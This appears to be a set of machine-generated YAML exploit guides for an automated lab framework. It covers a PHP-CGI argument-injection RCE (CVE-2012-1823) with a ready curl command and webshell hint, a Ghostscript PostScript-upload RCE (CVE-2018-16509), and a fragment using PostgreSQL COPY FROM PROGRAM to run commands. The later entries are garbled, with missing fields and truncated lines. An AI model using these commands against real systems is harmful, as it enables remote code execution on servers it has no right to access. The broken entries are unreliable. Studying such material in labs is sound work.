#### Exploit Guide for CVE-2012-1823:
version: 2
cve_id: CVE-2012-1823
summary: PHP-CGI argument injection (CVE-2012-1823) allows passing command-line arguments
  via the query string. Using -d to set allow_url_include=on and auto_prepend_file=php://input,
  arbitrary PHP code supplied in the POST body is executed, yielding remote command
  execution as www-data.
target:
  protocol: http
  port: 80
  service_role: web_application
  endpoints:
  - /index.php
preconditions:
  attack_vector: network
  privileges_required: none
  required_service:
    protocol: http
    port: 80
steps:
- id: exploit
  action: trigger PHP-CGI argument injection for RCE
  procedure: Send a POST request to /index.php with the query string ?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input
    and a PHP payload in the body. PHP-CGI treats the query string as CLI arguments,
    enabling php://input inclusion and execution of the body as PHP code.
  command_hint: 'curl -s -X POST ''http://{{target_ip}}:{{target_port}}/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input''
    -H ''Content-Type: application/x-www-form-urlencoded'' --data-binary ''<?php echo
    shell_exec("id"); ?>'''
  depends_on: []
  success_signal: Response contains command output such as 'uid=33(www-data) gid=33(www-data)
    groups=33(www-data)'
  materials: []
  execution:
    scope: actor
    tools:
    - id: curl
      kind: executable
      name: curl
      runtime: ''
      required: true
      artifact: null
    materials: []
    external_download: false
    fallback_ids: []
post_exploit:
  principal: service_user
  capabilities:
  - execute_command
  - read_file
  command_channel:
    type: webshell
    established_by:
    - exploit
    invocation_hint: Replace the POST body PHP code with <?php echo shell_exec("<CMD>");
      ?> to run arbitrary commands
    reusable: true
requirements:
  tools:
  - curl
  materials: []
  authentication: none
  callback: none

- native_verification.evidence[1]
- native_verification.evidence[2]
- native_verification.evidence[0]

version: 2
cve_id: CVE-2018-16509
summary: Upload a crafted PostScript file disguised as PNG through a web upload form
  to trigger a Ghostscript RCE that writes the flag to the web root, then retrieve
  it via HTTP.
target:
  protocol: http
  port: 8080
  service_role: web_application

  privileges_required: none

  procedure: POST the PoC PostScript file (poc.png) to the web upload form at the
    target's root endpoint. The server processes the file through Ghostscript, which
    interprets the embedded PostScript commands and executes them as root, writing
    the flag to the web root.
  command_hint: curl -s -X POST -F "file_upload=@/tmp/poc.png" http://{{target_ip}}:{{target_port}}/
    -w "\n%{http_code}"
  depends_on: []
  success_signal: HTTP 200 response containing 'Image size is:' text indicating the
    file was accepted and processed by Ghostscript
  materials:

    scope: actor

      kind: executable
      name: curl
      runtime: ''
      required: true
      artifact: null
    materials:
    - ref: source_bundle/poc.png
      scope: actor
      delivery: mounted
      destination: /tmp/poc.png
    external_download: false
    fallback_ids: []
- id: step-2
  action: Retrieve the flag from the web root
  procedure: Fetch the flag file that was written to the web root by the PostScript
    payload executed in step-1.
  command_hint: curl -s http://{{target_ip}}:{{target_port}}/flag_out.txt
  depends_on:
  - step-1

  materials: []

      ; then retrieve output from http://{{target_ip}}:{{target_port}}/out.txt'

    and execute the 'id' command using the COPY FROM PROGRAM feature to verify RCE.
  command_hint: python3 -c "import psycopg2; conn = psycopg2.connect(host='{{target_ip}}',

    cur = conn.cursor(); cur.execute('DROP TABLE IF EXISTS cmd_exec'); cur.execute('CREATE
    TABLE cmd_exec(cmd_output text)'); cur.execute(\"COPY cmd_exec FROM PROGRAM 'id'\");

    cur.close(); conn.close()"
